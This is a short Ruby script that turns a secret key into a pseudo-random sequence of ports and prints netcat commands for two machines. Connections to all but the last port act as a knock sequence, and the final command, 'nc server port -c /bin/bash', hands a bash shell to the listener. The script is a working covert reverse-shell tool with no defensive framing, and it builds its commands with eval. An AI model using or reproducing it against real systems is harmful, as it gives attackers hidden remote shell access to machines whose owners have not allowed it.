#!/usr/bin/env ruby

# command for the client to launch
SHELL = '/bin/bash'

# knocking command
NC_KNOCK = {
  :client => 'nc -z #{server} #{port}',
  :server => 'nc -z -l -p#{port}'
}
# shell-exec'ing command
NC_SHELL = {
  :client => 'nc #{server} #{port} -c' + SHELL,
  :server => 'nc -l -p#{port}'
}

# the server will bind (and client will connect) to ports in this range
low_port, high_port = 1024, 65535

exit puts("usage: #{$0} key [server]") || 1 if ARGV.empty?

key, server = ARGV

# the ports are created randomly with the key as a seed for the RNG. this
# should give big changes in ports with small changes in key.
srand key.unpack('c*').inject { |sum, n| sum + n }
ports = key.unpack('c*').collect { |i| (rand(65536) + i) % (high_port - low_port + 1) + low_port }

# generate commands for client and server, but skip client command if server
# isn't specified
[:client, :server].each do |machine|
  next if machine == :client && !server
  command = ports.collect do |port|
    template = (port == ports.last ? NC_SHELL : NC_KNOCK)[machine]
    eval('"' + template + '"')
  end.join(' && ')
  puts command
end
